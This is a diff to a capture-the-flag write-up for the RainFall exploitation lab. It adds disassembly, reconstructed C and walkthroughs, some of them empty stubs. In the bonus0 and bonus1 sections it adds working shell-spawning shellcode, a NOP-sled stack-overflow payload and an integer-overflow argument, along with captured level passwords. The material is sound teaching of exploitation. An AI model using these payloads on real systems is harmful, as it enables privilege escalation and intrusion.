@@ -31,6 +31,7 @@ Dump of assembler code for function main:
    0x08048ec0 <+0>:	push   %ebp
    0x08048ec1 <+1>:	mov    %esp,%ebp
    0x08048ec3 <+3>:	and    $0xfffffff0,%esp
+
    0x08048ec6 <+6>:	sub    $0x20,%esp
    0x08048ec9 <+9>:	mov    0xc(%ebp),%eax
    0x08048ecc <+12>:	add    $0x4,%eax
@@ -82,6 +83,25 @@ End of assembler dump.
 
 ### Equivalent C source code
 
+```c
+int        main(int ac, char **av)
+{
+    if (atoi(av[1]) == 423)
+    {
+        strdup()
+        getegid()
+        geteuid()
+        setresgid()
+        setresuid()
+        execv()
+    }
+    else
+    {
+        fwrite()
+    }
+}
+```
+
 ### Walkthrough
 
 ```bash
@@ -129,6 +149,15 @@ level1@RainFall:/home/user/level1$ cat .pass
 
 ### Equivalent C source code
 
+```c
+int    main()
+{
+    unsigned char buf[80];
+    
+    gets(buf + 16);
+}
+```
+
 ### Walkthrough
 
 - [Why gets() should not be used](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)
@@ -147,6 +176,17 @@ For bug reporting instructions, please see:
 Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
 (gdb) disas main
 Dump of assembler code for function main:
+   0x08048480 <+0>:     push   ebp
+   0x08048481 <+1>:     mov    ebp,esp
+   0x08048483 <+3>:     and    esp,0xfffffff0
+   0x08048486 <+6>:     sub    esp,0x50 ; ; Reserve 80 bytes on the stack
+   0x08048489 <+9>:     lea    eax,[esp+0x10] ; Set eax to esp + 16
+   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
+   0x08048490 <+16>:    call   0x8048340 <gets@plt> ; Call gets(eax)
+   0x08048495 <+21>:    leave
+   0x08048496 <+22>:    ret
+End of assembler dump.
+
    0x08048480 <+0>:     push   %ebp
    0x08048481 <+1>:     mov    %esp,%ebp
    0x08048483 <+3>:     and    $0xfffffff0,%esp
@@ -317,7 +357,7 @@ Dump of assembler code for function p:
    0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax ; Set 92nth byte of the stack as the return value of gets()
    0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc] ; Set eax as 92nth byte of the stack
    0x080484fb <+39>:    and    eax,0xb0000000 ; Apply bitmask (eax & 0xb0000000)
-   0x08048500 <+44>:    cmp    eax,0xb0000000 ; Check if higher byte of eax is >= '0xb0' && < '0xc0'
+   0x08048500 <+44>:    cmp    eax,0xb0000000 ; Check if higher byte of eax is == '0xb0'
    0x08048505 <+49>:    jne    0x8048527 <p+83> ; If it\'s the case continue, print the string w/ printf() & exit, else goto <p+83>
 
    0x08048507 <+51>:    mov    eax,0x8048620 ; gdb$ printf "%s", 0x8048620 -> "(%p)"
@@ -342,6 +382,22 @@ End of assembler dump.
 
 ### Equivalent C source code
 
+```c
+int    main(void)
+{
+    unsigned char buf[104];
+
+    fflush(stdout);
+    gets(buf + 28);
+    if (buf[92] == 0xb0)
+    {
+        printf("(%p)", buf + 92);
+        exit(1);
+    }
+    puts(buf + 28);
+    strdup(buf + 28);
+}
+```
 
 ### Walkthrough
 As we can see we're storing the output of gets() in to pointer to the 28h byte of the stack, which has a size limited to 104 bytes
@@ -525,14 +581,14 @@ End of assembler dump.
 // level3@RainFall:~$ cat /tmp/lol.c
 #include <stdio.h>
 
-# define m 0
+unsigned int m = 0;
 
 void    v(void) {
         unsigned char buf[536];
 
         fgets(buf + 520, 512, stdin);
         printf(buf + 520);
-        if (m == 0x40)
+        if (m == 0x40) // 64
         {
                 fwrite("Wait what?!\n", 1, 12, stdout);
                 system("/bin/sh");
@@ -1366,7 +1422,7 @@ So in our case we write a total of 76 bytes:
 
 - 4 to overwrite the chunk informations
 
-- 4 other to overwrite the rest of the malloc structure
+- 4 other to overwrite the rest of the malloc structure needed for alignement
 
 - 4 to fill the 2nd malloc() call, which is executed
 
@@ -1510,8 +1566,8 @@ void    m(void) {
 }
 
 int             main() {
-        void            *s1;
-        void            *s2;
+        uintptr_t       *s1;
+        uintptr_t       *s2;
         unsigned char   align[24];
 
         s1 = malloc(8);
@@ -1525,7 +1581,7 @@ int             main() {
         s2[1] = malloc(8);
         
         strcpy(s1[1], av[1]);
-        
+
         strcpy(s2[1], av[2]);
 
         fgets(0x8049960, 68, fopen("/home/user/level8/.pass", "r"));
@@ -1843,7 +1899,7 @@ level8@RainFall:~$
 
 ## Level 8
 
-- [`objdump -d` output](http://ix.io/2e7i)
+- [`-d` output](http://ix.io/2e7i)
 
 - [repnz scas instruction](https://stackoverflow.com/questions/26783797/repnz-scas-assembly-instruction-specifics)
 
@@ -2082,7 +2138,7 @@ int	main() {
 		}
 		if (*(rsi + 6) < *(rdi + 6) == 0)
 		{
-			if ((/* 0x8049aac */ val[0] + 0x20) == 0)
+			if ((/* 0x8049aac */ *(val[0] + 0x20) /* 0x8049acc */)) == 0)
 				system("/bin/sh");
 
 			fwrite("Password:\n", 1, 10, 0x8049aa0);
@@ -2164,6 +2220,511 @@ whoami
 level9
 cat /home/user/level9/.pass
 c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
+
+## Level9
+
+- [`-d` output](http://ix.io/2eLJ)
+
+### ASM Interpretation
+
+```asm
+
+```
+
+### Equivalent C source code
+
+### Walktrough
+
+
+## Bonus0
+
+- [`objdump -d` output](http://ix.io/2opX)
+
+### ASM Interpretation
+
+```asm
+Dump of assembler code for function main:
+   0x080485a4 <+0>:     push   ebp ; ASM Prologue
+   0x080485a5 <+1>:     mov    ebp,esp ; ASM Prologue
+   0x080485a7 <+3>:     and    esp,0xfffffff0 ; ASM Prologue
+
+   0x080485aa <+6>:     sub    esp,0x40 ; Allocate 0x40 bytes / 64
+   0x080485ad <+9>:     lea    eax,[esp+0x16] ; Set eax to esp+0x16 (22th byte of the stack)
+   0x080485b1 <+13>:    mov    DWORD PTR [esp],eax ; Push eax
+   0x080485b4 <+16>:    call   0x804851e <pp> ; Call pp(eax)
+   0x080485b9 <+21>:    lea    eax,[esp+0x16] ; Set eax to esp+0x16 (22th byte of the stack)
+   0x080485bd <+25>:    mov    DWORD PTR [esp],eax ; Push eax
+   0x080485c0 <+28>:    call   0x80483b0 <puts@plt> ; Call puts(eax)
+   0x080485c5 <+33>:    mov    eax,0x0 ; Set 0 as return value
+
+   0x080485ca <+38>:    leave
+   0x080485cb <+39>:    ret
+End of assembler dump.
+
+Dump of assembler code for function pp:
+   0x0804851e <+0>:     push   ebp
+   0x0804851f <+1>:     mov    ebp,esp
+   0x08048521 <+3>:     push   edi
+   0x08048522 <+4>:     push   ebx
+
+   0x08048523 <+5>:     sub    esp,0x50 ; Allocate 0x50 (80) bytes
+   0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0 ; Push 0x80486a0 as 2nd argument of p (gdb) printf "%s", 0x80486a0 -> " - "
+   0x0804852e <+16>:    lea    eax,[ebp-0x30] ; Set eax to ebp-0x30 (48th byte of the stack)
+   0x08048531 <+19>:    mov    DWORD PTR [esp],eax ; Push eax
+   0x08048534 <+22>:    call   0x80484b4 <p> ; Call p(ebp-0x30, " - ")
+
+   0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0 ; Push 0x80486a0 as 2nd argument of p (gdb) printf "%s", 0x80486a0 -> " - "
+   0x08048541 <+35>:    lea    eax,[ebp-0x1c] ; Set eax to ebp-0x1c (28th byte of the stack)
+   0x08048544 <+38>:    mov    DWORD PTR [esp],eax ; Push eax
+   0x08048547 <+41>:    call   0x80484b4 <p> ; Call p(ebp-0x1c, " - ")
+
+   0x0804854c <+46>:    lea    eax,[ebp-0x30] ; Set eax to ebp-0x30
+   0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax ; Push eax as 2nd argument of strcpy
+   0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8] ; Set eax to ebp (1st argument of pp)
+   0x08048556 <+56>:    mov    DWORD PTR [esp],eax ; Push eax
+   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt> ; call strcpy(ebp+0x8, ebp-0x30)
+
+   0x0804855e <+64>:    mov    ebx,0x80486a4 ; Set ebx to 0x80486a4
+   0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8] ; Set eax to the value of the first argument of pp
+   0x08048566 <+72>:    mov    DWORD PTR [ebp-0x3c],0xffffffff ; Set *ebp-0x3c (60th byte) to 0
+
+   0x0804856d <+79>:    mov    edx,eax
+   0x0804856f <+81>:    mov    eax,0x0
+   0x08048574 <+86>:    mov    ecx,DWORD PTR [ebp-0x3c]
+   0x08048577 <+89>:    mov    edi,edx
+   0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi] ; https://stackoverflow.com/questions/26783797/repnz-scas-assembly-instruction-specifics
+   0x0804857b <+93>:    mov    eax,ecx : Set eax to ecx
+   0x0804857d <+95>:    not    eax ; !eax
+   0x0804857f <+97>:    sub    eax,0x1 ; Remove 1 to eax
+   0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8] ; Add the value of the 1st argument of pp to eax
+   0x08048585 <+103>:   movzx  edx,WORD PTR [ebx] ; 
+   0x08048588 <+106>:   mov    WORD PTR [eax],dx
+
+   0x0804858b <+109>:   lea    eax,[ebp-0x1c] ; Set eax to ebp-0x1c (28th byte of the stack)
+   0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax : Set eax as 2nd argument of strcat
+   0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8] ; Set eax to 1st argument of pp
+   0x08048595 <+119>:   mov    DWORD PTR [esp],eax : Push eax
+   0x08048598 <+122>:   call   0x8048390 <strcat@plt> ; Call strcat(pp_1st_arg, eax)
+
+   0x0804859d <+127>:   add    esp,0x50 : free allocated bytes
+
+   0x080485a0 <+130>:   pop    ebx
+   0x080485a1 <+131>:   pop    edi
+   0x080485a2 <+132>:   pop    ebp
+   0x080485a3 <+133>:   ret
+End of assembler dump.
+
+Dump of assembler code for function p:
+   0x080484b4 <+0>:     push   ebp
+   0x080484b5 <+1>:     mov    ebp,esp
+
+   0x080484b7 <+3>:     sub    esp,0x1018 ; Allocate 0x1018 (4120) bytes on the stack
+   0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc] ; Set eax to 2nd argument of p
+   0x080484c0 <+12>:    mov    DWORD PTR [esp],eax ; Push eax
+   0x080484c3 <+15>:    call   0x80483b0 <puts@plt> ; Call puts(p_2nd_arg)
+
+   0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000 ; Set 3rd argument of read to 4096
+   0x080484d0 <+28>:    lea    eax,[ebp-0x1008] ; Set eax to 4104th byte of the stack
+   0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax ; Set eax to 2nd argument of read
+   0x080484da <+38>:    mov    DWORD PTR [esp],0x0 ; Set 0 as 1st argument of read
+   0x080484e1 <+45>:    call   0x8048380 <read@plt> ; Call read(0, ebp-0x1004, 4096)
+
+   0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa ; Set 2nd argument of strchr to 0xa (10)
+   0x080484ee <+58>:    lea    eax,[ebp-0x1008] ; Set eax to 4104th byte of the stack 
+   0x080484f4 <+64>:    mov    DWORD PTR [esp],eax ; Set the 1st argument of strchr to eax
+   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt> ; Call strchr(ebp-0x1004, 10);
+
+   0x080484fc <+72>:    mov    BYTE PTR [eax],0x0 ; Set the value of the return address of strchr to 0
+
+   0x080484ff <+75>:    lea    eax,[ebp-0x1008] ; Set eax to ebp-0x1008
+   0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14 ; Set the 3rd argument of strncpy to 0x14 (20)
+   0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax ; Set the 2nd argument of strncpy to eax
+   0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8] ; Set eax to the 1st argument of p
+   0x08048514 <+96>:    mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strncpy
+   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt> ; Call strncpy(p_1st_arg, ebp-0x1008, 20)
+
+   0x0804851c <+104>:   leave
+   0x0804851d <+105>:   ret
+End of assembler dump.
+```
+
+### Equivalent C source code
+
+```c
+void p(char *p_1st_arg, char *p_2nd_arg)
+{
+	char buff[4104];
+
+	puts(p_2nd_arg);
+	read(0, buff, 4096);
+
+	*strchr(buff, 10 /* '\n' */) = 0;
+
+	strncpy(p_1st_arg, buff, 20);
+	return;
+}
+
+
+void pp(char *pp_1st_arg)
+{
+	char str1[20];
+	char str2[20];
+
+	p(str1, " - ");
+	p(str2, " - ");
+
+	strcpy(pp_1st_arg, str1);
+	pp_1st_arg[strlen(pp_1st_arg)] = 32; // ' '
+
+	strcat(pp_1st_arg, str2);
+	return;
+}
+
+int		main()
+{
+	unsigned char	buf[64];
+
+	pp(buf + 22);
+	puts(buf + 22);
+	return (0);
+}
+```
+
+### Walktrough
+
+```
+bonus0@RainFall:~$ ./bonus0
+ -
+a
+ -
+a
+a a
+
+bonus0@RainFall:~$ python -c 'print "A" * 50'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+bonus0@RainFall:~$ ./bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+```
+
+Without looking at the code, we can see the program segfaults when we pass large strings
+
+Let's grab a string from https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ and try again to find EIP offset
+
+```bash
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2...
+ -
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac...
+Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41336141 in ?? ()
+```
+
+With Eip equals to `0x41336141`, we know our offset is 9!
+
+Let's inject a shellcode in our environment
+
+```bash
+export SHELLCODE="$(echo -n -e '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')"
+
+bonus0@RainFall:~$ gdb ./bonus0
+(gdb) b main
+Breakpoint 1 at 0x80485a7
+
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+Breakpoint 1, 0x080485a7 in main ()
+
+(gdb) x/1s *((char **)environ)
+0xbffff8b6:	 "SHELLCODE=j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
+```
+
+We can see our shellcode is stored at address `0xbffff8b6 + 0xa (equals to strlen("SHELLCODE="))` so `0xbffff8c0`
+
+To be sure it is hit, let's add a big enough nopsled and try to execute the shellcode
+
+```bash
+bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90" * 4096 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
+
+bonus0@RainFall:~$ gdb ./bonus0 --eval-command='b main' --eval-command='r' --eval-command='print *((char **)environ)' --eval-command='quit'
+...
+Breakpoint 1 at 0x80485a7
+Starting program: /home/user/bonus0/bonus0
+
+Breakpoint 1, 0x080485a7 in main ()
+$1 = 0xbfffe8b6 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+A debugging session is active.
+
+	Inferior 1 [process 3637] will be killed.
+
+Quit anyway? (y or n) y
+
+bonus0@RainFall:~$ python -c 'print(hex(0xbfffe8b6 + 512))'
+0xbfffeab6L
+
+bonus0@RainFall:~$ python -c 'print "A" * 4095 + "\n" + "\x90" * 9 + "\xb6\xea\xff\xbf" + "AAAA" * 50' > /tmp/payload
+
+bonus0@RainFall:~$ cat /tmp/payload - | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAA�������������AAAAAAA�� �������������AAAAAAA��
+pwd
+/home/user/bonus0
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
+
+## Bonus1
+
+- [`objdump -d` output](http://ix.io/2oZb)
+
+```bash
+bonus1@RainFall:~$ objdump  -R ./bonus1
+
+./bonus1:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049760 R_386_GLOB_DAT    __gmon_start__
+08049770 R_386_JUMP_SLOT   memcpy
+08049774 R_386_JUMP_SLOT   __gmon_start__
+08049778 R_386_JUMP_SLOT   __libc_start_main
+0804977c R_386_JUMP_SLOT   execl
+08049780 R_386_JUMP_SLOT   atoi
+```
+
+### ASM Interpretation
+
+```asm
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048424 <+0>:	push   ebp
+   0x08048425 <+1>:	mov    ebp,esp
+   0x08048427 <+3>:	and    esp,0xfffffff0
+   0x0804842a <+6>:	sub    esp,0x40
+   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048430 <+12>:	add    eax,0x4
+   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
+   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
+   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
+   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
+   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
+   0x08048446 <+34>:	jle    0x804844f <main+43>
+   0x08048448 <+36>:	mov    eax,0x1
+   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
+   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
+   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
+   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804845d <+57>:	add    eax,0x8
+   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
+   0x08048462 <+62>:	mov    edx,eax
+   0x08048464 <+64>:	lea    eax,[esp+0x14]
+   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
+   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
+   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
+   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
+   0x08048480 <+92>:	jne    0x804849e <main+122>
+   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
+   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
+   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
+   0x08048499 <+117>:	call   0x8048350 <execl@plt>
+   0x0804849e <+122>:	mov    eax,0x0
+   0x080484a3 <+127>:	leave
+   0x080484a4 <+128>:	ret
+End of assembler dump.
+```
+
+### Equivalent C code
+
+```c
+int		main(int ac, char **av) {
+	int				x; // esp+0x3c
+	unsigned char	buf[60]; // esp
+
+	x = atoi(av[1]);
+	if (x <= 9)
+	{
+		memcpy(&buf[20], av[2], x * 4);
+		if (x != 0x574f4c46) // main+84 / 0x08048478
+		{
+			;
+		}
+		else 
+		{
+			execl("/bin/sh", "sh", 0);
+		}
+	}
+	else
+	{
+		return (1);
+	}
+
+	return (0);
+}
+```
+
+### Walktrough
+
+Let's verify that argv[1] is compared with <= atoi("9") and our interpretation of the 1st if was right
+
+```bash
+bonus1@RainFall:~$ gdb ./bonus1
+...
+(gdb) b main
+Breakpoint 1 at 0x8048427
+
+(gdb) r 9 AAAA
+
+(gdb) b *0x08048441 # (main+29, cmp instruction)
+Breakpoint 2 at 0x8048441
+
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048441 in main ()
+(gdb) info registers
+eax            0x9	9
+ecx            0x0	0
+edx            0x0	0
+...
+
+(gdb) b *0x0804844f # (main+43)
+Breakpoint 3 at 0x804844f
+
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x0804844f in main ()
+# we're in the if condition!
+```
+
+```bash
+bonus1@RainFall:~$ ./bonus1 9 AAAA; echo $?
+0
+
+bonus1@RainFall:~$ ./bonus1 8 AAAA; echo $?
+0
+
+bonus1@RainFall:~$ ./bonus1 10 AAAA; echo $?
+1
+```
+
+Now that we're in the if we have to overwrite the value of the variable at the address `esp+0x3c` with `0x574f4c46`
+
+```bash
+bonus1@RainFall:~$ python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+AAAAAAAAAAAAFLOW
+
+bonus1@RainFall:~$ ./bonus1 9 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
+
+bonus1@RainFall:~$ gdb ./bonus1
+...
+(gdb) b main
+Breakpoint 1 at 0x8048427
+(gdb) r  9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+Starting program: /home/user/bonus1/bonus1 9 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+
+Breakpoint 1, 0x08048427 in main ()
+(gdb) b *0x08048478
+Breakpoint 2 at 0x8048478
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048478 in main ()
+(gdb) x/60x $esp
+0xbffff650:	0xbffff664	0xbffff889	0x00000024	0x080482fd
+0xbffff660:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
+0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff680:	0x41414141	0x41414141	0x080484b9   [ 0x00000009 ]
+...
+```
+
+We can see that even with enougth bytes to overflow the buffer, our value wasn't overwritten because the `memcpy` is limited to `(x * 4)` so if the max value of `x` is 9, the memcpy is limited to `36` bytes, we would need 8 more to overwrite the result of atoi()
+
+One way of doing this would be to use a negative value for argv[1], so when doing `atoi(argv[1]) * 4`, the integer would overflow and save only the difference with int_min, the minimum value of a 4 bytes int is `-2147483648`, so if we pass `-2147483640`, our int will have the value of `(-2147483648 - -2147483640) * 4 = 32`
+
+Let's try to make our int equals to 40 bytes to overwrite the compared value
+
+```bash
+bonus1@RainFall:~$ gdb ./bonus1
+...
+(gdb) b main
+Breakpoint 1 at 0x8048427
+
+(gdb) r -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+Starting program: /home/user/bonus1/bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+
+Breakpoint 1, 0x08048427 in main ()
+
+(gdb) b *0x08048478
+Breakpoint 2 at 0x8048478
+
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048478 in main ()
+
+(gdb) x/60x $esp
+0xbffff650:	0xbffff664	0xbffff889	0x0000002c	 0x080482fd
+0xbffff660:	0xb7fd13e4	0x41414141	0x41414141	 0x41414141
+0xbffff670:	0x41414141	0x41414141	0x41414141	 0x41414141
+0xbffff680:	0x41414141	0x41414141	0x41414141  [ 0x574f4c46 ]
+
+(gdb) c
+Continuing.
+process 2853 is executing new program: /bin/dash
+Error in re-setting breakpoint 1: Function "main" not defined.
+$
+```
+
+Let's try again without gdb:
+
+```bash
+bonus1@RainFall:~$ ./bonus1 -2147483637 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFLOW
+$ whoami
+bonus2
+$ pwd
+/home/user/bonus1
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+
+## Bonus2
+
+### ASM Interpretation
+
+### Equivalent C code
+
+### Walktrough
+
+```bash
+
+```
+
+## Bonus3 (end)
+
+### ASM Interpretation
+
+### Equivalent C code
+
+### Walktrough
+
+```bash
+
 ```
 
 ## Misc / References
@@ -2249,5 +2810,8 @@ level6 -> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 level7 -> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 level8 -> 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 level9 -> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+bonus0 -> 
+bonus1 -> cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+bonus2 -> 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+bonus3 ->
 ```
-
